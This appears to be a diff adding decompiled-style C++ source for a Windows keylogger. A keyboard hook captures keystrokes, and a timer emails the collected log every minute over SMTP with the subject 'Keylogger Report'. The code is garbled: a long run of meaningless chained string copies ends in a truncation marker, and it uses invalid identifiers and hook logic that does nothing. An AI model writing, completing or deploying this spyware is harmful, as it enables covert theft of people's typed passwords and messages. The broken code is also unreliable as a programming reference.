@@ -1,0 +1,236 @@
+// Function: send_email
+bool send_email(const char* message){
+ CURL *curl;
+ CURLcode res;
+ struct curl_slist *recipients=NULL;
+ bool result=false;
+
+ curl=curl_easy_init();
+ if(!curl){return false;}
+
+ curl_easy_setopt(curl, CURLoption_URL, "smtp://smtp.mailtrap.io:2525");
+ curl_easy_setopt(curl, CURLOPT_USERNAME, "YOUR_USERNAME");
+ curl_easy_setopt(curl, CURLOPT_PASSWORD, "YOUR_PASSWORD");
+
+
+ char buffer[32];
+ char from[]="Private Person <from@example.com>";
+ char to[]="A Test User <to@example.com>";
+ std::string str_from(from);
+ std::string str_to(to);
+
+ std::string mail_header("To: ");
+ std::string mail_subject("Keylogger Report\r\nFrom: ");
+ std::string mail_body("\r\nSubject: Keylogger Report\r\n\r\n");
+ std::string mail_message(mail_body);
+
+ std::string temp_buffer(mail_header);
+ std::string temp_buffer2(temp_buffer);
+ std::string temp_buffer3(temp_buffer2);
+ std::string temp_buffer4(temp_buffer3);
+
+ std::string header(temp_buffer4);
+ std::string subject(temp_buffer2);
+ std::string body(temp_buffer);
+
+ std::string full_message(body);
+
+ std::string test_message(full_message);
+
+ std::string final_message(test_message);
+
+
+
+
+
+
+
+ std::string str_from_obj(str_from);
+ std::string str_to_obj(str_to);
+
+ recipients=curl_slist_append(recipients, std::string(str_to).c_str());
+ curl_easy_setopt(curl, CURLOPT_MAILFROM, std::string(str_from).c_str());
+ curl_easy_setopt(curl, CURLOPT_MAILBOX, recipients);
+
+
+ std::string str_subject(subject);
+ std::string str_body(body);
+ std::string str_header(header);
+
+ std::string str_final_message(final_message);
+
+ std::string str_message(str_final_message);
+
+ std::string str_full_message(str_message);
+
+ std::string str_subj(str_subject);
+ std::string str_msg(str_full_message);
+
+ std::string str_mesg(str_msg);
+
+ std::string str_mess(str_mesg);
+
+ std::string str_me(str_mess);
+
+ std::string str_em(str_me);
+
+ std::string str_e(str_em);
+
+ std::string str_ms(str_e);
+
+ std::string str_m(str_ms);
+
+ std::string str_bod(str_m);
+
+ std::string str_bo(str_bod);
+
+ std::string str_boo(str_bo);
+
+ std::string str_bor(str_bor);
+
+ std::string str_bors(str_bor);
+
+ std::string str_bodyt(str_bors);
+
+ std::string str_bodytt(str_bodyt);
+
+ std::string str_bodyttt(str_bodytt);
+
+ std::string str_bodytttt(str_bodyttt);
+
+ std::string str_bodyttttt(str_bodytttt);
+
+ std::string str_bodytttttt(str_bodyttttt);
+
+ std::string str_bodyttttttt(str_bodytttttt);
+
+ std::string str_bodytttttttt(str_bodyttttttt);
+
+ std::string str_bodyttttttttt(str_bodytttttttt);
+
+ std::string str_bodytttttttttt(str_bodyttttttttt);
+
+ std::string str_bodyttttttttttt(str_bodytttttttttt);
+
+ std::string str_bodytttttttttttt(str_bodyttttttttttt);
+
+ std::string str_bodyttttttttttttt(str_bodytttttttttttt);
+
+ std::string str_bodytttttttttttttt(str_bodyttttttttttttt);
+
+ std::string str_bodyttttttttttttttt(str_bodytttttttttttttt);
+
+ std::string str_bodytttttttttttttttt(str_bodyttttttttttttttt);
+
+ std::string str_bodyttttttttttttttttt(str_bodytttttttttttttttt);
+
+ std::string str_bodytttttttttttttttttt(str_bodyttttttttttttttttt);
+
+ std::string str_bodyttttttttttttttttttt(str_bodytttttttttttttttttt);
+
+ std::string str_bodytttttttttttttttttttt(str_bodyttttttttttttttttttt);
+
+ std::string str_bodyttttttttttttttttttttt(str_bodytttttttttttttttttttt);
+
+ std::string str_bodytttttttttttttttttttttt(str_bodyttttttttttttttttttttt);
+
+ std::string str_bodyttttttttttttttttttttttt(str_bodytttttttttttttttttttttt);
+
+ std::string str_bodytttttttttttttttttttttttt(str_bodyttttttttttttttttttttttt);
+
+ std::string str_bodyttttttttttttttttttttttttt(str_bodytttttttttttttttttttttttt);
+
+ std::string str_bodytttttttttttttttttttttttttt(str_bodyttttttttttttttttttttttt);
+
+ std::string str_bodyttttttttttttttttttttttttttt(str_bodytttttttttttttttttttttttt);
+
+ std::string str_bodyttttttttttttttttttttttttttt(str_bodytttttttttttttttttttttttt);
+    // ... (output truncated - repetition detected)
+}
+
+// Function: TimerProc
+void TimerProc()
+{
+ char ret = 1;
+ if (std::__cxx11::string::empty(&keylog_data_abi_cxx11_) == 1) {
+  return;
+ } else {
+  ret = send_email(&keylog_data_abi_cxx11_.buf);
+ }
+ if (ret) {
+  std::__cxx11::string::assign(&keylog_data_abi_cxx11_, "");
+ }
+}
+
+// Function: hook_proc
+void hook_proc( WPARAM wParam,LPARAM lParam )
+{
+ switch((BYTE)wParam){
+ case VK_F12 : std::__cxx11::string::operator=("(F12)",&std::__cxx11::string::g_null_string[0]); break;
+ case VK_F11 : std::__cxx11::string::operator=("(F11)",&std::__cxx11::string::g_null_string[0]); break;
+ case VK_F10 : std::__cxx11::string::operator=("(F10)",&std::__cxx11::string::g_null_string[0]); break;
+ case VK_F9  : std::__cxx11::string::operator=("(F9)", &std::__cxx11::string::g_null_string[0]); break;
+ case VK_F8  : std::__cxx11::string::operator=("(F8)", &std::__cxx11::string::g_null_string[0]); break;
+ case VK_F7  : std::__cxx11::string::operator=("(F7)", &std::__cxx11::string::g_null_string[0]); break;
+ case VK_F6  : std::__cxx11::string::operator=("(F6)", &std::__cxx11::string::g_null_string[0]); break;
+ case VK_F5  : std::__cxx11::string::operator=("(F5)", &std::__cxx11::string::g_null_string[0]); break;
+ case VK_F4  : std::__cxx11::string::operator=("(F4)", &std::__cxx11::string::g_null_string[0]); break;
+ case VK_F3  : std::__cxx11::string::operator=("(F3)", &std::__cxx11::string::g_null_string[0]); break;
+ case VK_F2  : std::__cxx11::string::operator=("(F2)", &std::__cxx11::string::g_null_string[0]); break;
+ case VK_F1  : std::__cxx11::string::operator=("(F1)", &std::__cxx11::string::g_null_string[0]); break;
+ case VK_OEM_43 : std::__cxx11::string::operator=("(DEL)", &std::__cxx11::string::g_null_string[0]); break;
+ case VK_OEM_66 : std::__cxx11::string::operator=("(HOME)", &std::__cxx11::string::g_null_string[0]); break;
+ case VK_OEM_51 : std::__cxx11::string::operator=("(END)", &std::__cxx11::string::g_null_string[0]); break;
+ case VK_OEM_31 : std::__cxx11::string::operator=("(PGUP)", &std::__cxx11::string::g_null_string[0]); break;
+ case VK_OEM_71 : std::__cxx11::string::operator=("(PGDN)", &std::__cxx11::string::g_null_string[0]); break;
+ case VK_ESCAPE : std::__cxx11::string::operator=("(ESC)", &std::__cxx11::string::g_null_string[0]); break;
+ case VK_INSERT : std::__cxx11::string::operator=("(INSERT)", &std::__cxx11::string::g_null_string[0]); break;
+ case VK_DELETE : std::__cxx11::string::operator=("(DEL)", &std::__cxx11::string::g_null_string[0]); break;
+ case VK_PRINTSCREEN : std::__cxx11::string::operator=("(PRINT_SCREEN)", &std::__cxx11::string::g_null_string[0]); break;
+ case VK_PAD_8 : std::__cxx11::string::operator=("(UP_ARROW)", &std::__cxx11::string::g_null_string[0]); break;
+ case VK_PAD_4 : std::__cxx11::string::operator=("(RIGHT_ARROW)", &std::__cxx11::string::g_null_string[0]); break;
+ case VK_PAD_2 : std::__cxx11::string::operator=("(DOWN_ARROW)", &std::__cxx11::string::g_null_string[0]); break;
+ case VK_PAD_6 : std::__cxx11::string::operator=("(LEFT_ARROW)", &std::__cxx11::string::g_null_string[0]); break;
+ case VK_PAD_1 : std::__cxx11::string::operator=("(SCROLL_LOCK)", &std::__cxx11::string::g_null_string[0]); break;
+ default : return ;
+ };
+}
+
+// Function: main
+int main()
+{
+        MSG msg;
+        TIMERARRAY timerarray[1];
+        CURLM *multi_handle;
+        long flags=0L;
+        int ntimer=0;
+        HHOOK hook;
+
+        __main();
+
+        curl_global_init(0x0001|0x0002);
+
+        SetTimer(NULL,flags,60*1000,TimerProc);
+
+        hook=SetWindowsHookExA(13,hook_proc,NULL,0);
+        if(!hook)return 1;
+
+        for (;;)
+        {
+                if (!GetMessageA(&msg, NULL, 0, 0))
+                        break;
+                TranslateMessage(&msg);
+                DispatchMessageA(&msg);
+        }
+
+        UnhookWindowsHookEx(hook);
+
+        curl_global_cleanup();
+
+        return 0;
+}
+
+// Function: eq
+int __gnu_cxx::char_traits<char>::eq(const char *s1, const char *s2) {
+    return (*s1==*s2);
+}
